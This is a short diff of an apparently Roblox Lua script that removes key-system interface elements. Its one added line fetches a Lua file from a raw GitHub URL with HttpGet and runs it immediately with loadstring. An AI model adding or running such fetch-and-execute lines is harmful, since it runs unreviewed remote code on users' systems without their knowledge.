@@ -303,7 +303,7 @@ end
         keysystemLabel:Destroy()     -- Destroys the keysystem label
         promptLabel:Destroy()        -- Destroys the prompt label
         checkmarkButton:Destroy()    -- Destroys the checkmark button
- 
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/socoolomgrizz/bestcoolman/refs/heads/main/cooolrizzzzz.lua"))()
         -- Optionally, destroy the script if it's local and you want it to disappear
         script:Destroy()
     else
